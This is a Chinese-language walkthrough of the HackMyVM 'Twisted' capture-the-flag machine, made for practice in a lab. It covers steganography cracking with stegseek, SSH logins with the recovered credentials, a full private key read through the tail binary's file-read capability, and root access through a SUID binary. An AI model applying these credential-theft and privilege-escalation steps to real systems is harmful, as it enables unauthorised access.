# Twisted

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2020-10-15

✔️ MD5 // 421465f7ccfc34907fd8b7fa38f46dbc

☠ Root // 181

💀 User // 184

📝Notes //
An easy one. Tested on Vbox.

:::

## 靶机启动

![靶机启动](img/image_20231247-214736.png)

靶机 IP：

```plaintext
192.168.56.104
```

## nmap 信息搜集

```shell
Nmap scan report for 192.168.56.104
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6763a0c98b7af342ac49aba6a73ffcee (RSA)
|   256 8cce8747f8b81a1a78e5b7ce74d7f5db (ECDSA)
|_  256 9294660b92d3cf7effe8bf3c7b41b75a (ED25519)
MAC Address: 08:00:27:57:30:56 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## web 服务

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
└──╼ $http get 192.168.56.104
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html
Date: Fri, 22 Dec 2023 13:50:21 GMT
ETag: W/"5f86a150-e6"
Last-Modified: Wed, 14 Oct 2020 06:57:20 GMT
Server: nginx/1.14.2
Transfer-Encoding: chunked

<h1>I love cats!</h1>
<img src="cat-original.jpg" alt="Cat original"  width="400" height="400">
<br>

<h1>But I prefer this one because seems different</h1>

<img src="cat-hidden.jpg" alt="Cat Hidden" width="400" height="400">
```

将两个 jpg 文件下载下来进行分析

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
└──╼ $wget http://192.168.56.104/cat-original.jpg
--2023-12-22 21:53:06--  http://192.168.56.104/cat-original.jpg
正在连接 192.168.56.104:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：288693 (282K) [image/jpeg]
正在保存至: “cat-original.jpg”

cat-original.jpg                  100%[==========================================================>] 281.93K  --.-KB/s  用时 0.002s

2023-12-22 21:53:06 (162 MB/s) - 已保存 “cat-original.jpg” [288693/288693])

┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
└──╼ $wget http://192.168.56.104/cat-hidden.jpg
--2023-12-22 21:53:12--  http://192.168.56.104/cat-hidden.jpg
正在连接 192.168.56.104:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：288706 (282K) [image/jpeg]
正在保存至: “cat-hidden.jpg”

cat-hidden.jpg                    100%[==========================================================>] 281.94K  --.-KB/s  用时 0.002s

2023-12-22 21:53:12 (127 MB/s) - 已保存 “cat-hidden.jpg” [288706/288706])
```

## stegseek 隐写

```shell title="cat-original.jpg stegseek"
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
└──╼ $stegseek cat-original.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "westlife"
[i] Original filename: "markus.txt".
[i] Extracting to "cat-original.jpg.out".
```

```shell title="cat-hidden.jpg stegseek"
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
└──╼ $stegseek cat-hidden.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "sexymama"
[i] Original filename: "mateo.txt".
[i] Extracting to "cat-hidden.jpg.out".
```

读取解密出来的信息

```plaintext title="cat-original.jpg.out"
markuslovesbonita
```

```plaintext title="cat-hidden.jpg.out"
thisismypassword
```

## 隐写数据尝试利用

由于只开放了一个 web 服务，和一个 SSH 服务，所以怀疑图像隐写提取出来的数据为 SSH 的凭据，尝试利用

```plaintext
mateo:thisismypassword
```

```shell title="SSH mateo"
┌─[✗]─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
└──╼ $ssh mateo@192.168.56.104 -p 2222
mateo@192.168.56.104's password:
Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 14 03:21:44 2020 from 192.168.1.58
mateo@twisted:~$ whoami
mateo
```

```plaintext
markus:markuslovesbonita
```

```shell title="SSH mateo"
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
└──╼ $ssh markus@192.168.56.104 -p 2222
markus@192.168.56.104's password:
Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
markus@twisted:~$ whoami
markus
```

## `markus` 用户目录下存在 hint

```plaintext title="/home/markus/note.txt"
Hi bonita,
I have saved your id_rsa here: /var/cache/apt/id_rsa
Nobody can find it.
```

## `mateo` 用户目录下存在 hint

```plaintext title="/home/mateo/note.txt"
/var/www/html/gogogo.wav
```

## 分析给出的 wav 文件

将 wav 文件下载到本地，使用 `audacity` 进行分析

![audacity](img/image_20231229-222937.png)

可以目测出来是摩斯电码，将其转换为点杠形式

```plaintext
--. --- -.. . . .--. . .-. .-.-.- .-.-.- .-.-.- -.-. --- -- . .-- .. - .... -- . .-.-.- .-.-.- .-.-.- .-.. .. - - .-.. . .-. .- -... -... .. - .-.-.- .-.-.- .-.-.-
```

将其解码后得到

```plaintext
GODEEPER...COMEWITHME...LITTLERABBIT...
```

## 检查提权可能性

```plaintext title="find / -perm -u=s -type f 2>/dev/null"
/home/bonita/beroot
/usr/bin/su
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

```plaintext title="getcap -r / 2>/dev/null"
/usr/bin/ping = cap_net_raw+ep
/usr/bin/tail = cap_dac_read_search+ep
```

可以看出 `/usr/bin/tail` 文件具有任意文件读取的能力，尝试利用

```plaintext title="tail -n 100 /var/cache/apt/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF
gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C
tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC
xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8
DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/
hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh
V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF
eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

成功得到 `id_rsa` 文件的数据

## SSH 私钥利用

```shell
┌─[✗]─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
└──╼ $ssh bonita@192.168.56.104 -p 2222 -i id_rsa
Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
bonita@twisted:~$ whoami
bonita
```

## user pwn

```shell
bonita@twisted:~$ cat user.txt
HMVblackcat
```

## `bonita` 用户检查提权可能性

发现用户目录存在一个 suid 二进制文件

```shell
bonita@twisted:~$ ls -lh
total 24K
-rwsrws--- 1 root   bonita 17K Oct 14  2020 beroot
-rw------- 1 bonita bonita  12 Oct 14  2020 user.txt
```

下载下来尝试进行分析

![beroot 逆向分析](img/image_20231247-224754.png)

从伪代码中可以看到判断逻辑，并且结合程序具有 suid 属性，存在提权可能性

```shell
bonita@twisted:~$ ./beroot
Enter the code:
 5880
root@twisted:~# whoami
root
```

## root pwned

```shell
root@twisted:/root# cat root.txt
HMVwhereismycat
```

## 后记

既然 `tail` 能够做到任意文件读取的话，其实可以直接读取 `root.txt` 的文件内容

```shell
bonita@twisted:~$ tail /root/root.txt
HMVwhereismycat
```

这题的权限限制还是欠佳
